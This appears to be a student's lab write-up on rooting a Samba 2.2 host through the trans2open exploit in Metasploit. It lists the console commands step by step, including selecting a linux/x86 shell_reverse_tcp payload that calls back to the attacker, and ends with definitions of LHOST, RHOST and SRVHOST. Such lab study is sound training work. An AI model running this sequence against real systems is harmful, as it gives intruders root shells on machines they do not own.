<title>Gaining Root with Metasploit</title>
</head><body>- Will going to run MetaSploit (i.e. Will Use Ctrl + c to stop the exceution So keep in mind not to use Ctrl + Z Cuz it will close the Metasploit Framework)<br/>
- But before that will use searchsploit for samba 2.2 as we have noticed trans2open showed up and it meet the criteria as well<br/>
 and the mentor thinks it's the winner and will try to exploit it.<br/>
- Now will open the MetaSploit and search for trans2open in it<br/>
command : msfconsole<br/>
command : search samba<br/>
<br/>
- As a result we got the list of OS but we are good Enumerator's , Good Investogator's , Researcher's , Information Gather's <br/>
- We could have saw Vily - Nily saw 139 and never looked at any other ports.<br/>
command: use 1<br/>
command: options<br/>
command: set RHOSTS 192.168.142.129<br/>
command: options<br/>
command: show target's<br/>
command: run/exploit<br/>
<br/>
- The code will run and die as there is issue with the Payload so will run again the options command <br/>
 and Metasploit will give us the payload options this time.<br/>
- As we can see we have been ruuning staged Payload.<br/>
<br/>
So how to pick/select a Payload ??<br/>
command : set payload linux/x86 PRESS tab to see the options<br/>
command: set payload linux/x86/shell_reverse_tcp<br/>
which is a Non_staged Payload.<br/>
command: run<br/>
<br/>
Hurray ^_^ we have successfully rooted the machine and root is the commandor of the System.<br/>

<br/>
In Metasploit, LHOST, RHOST and SRVHOST are some of the most commonly used variable names. <br/>
LHOST refers to the IP of your machine, which is usually used to create a reverse connection to your machine after the attack succeeds.<br/>
RHOST refers to the IP address of the target host. <br/>
And SRVHOST is where the module will connect to download additional payload elements.</body></html>
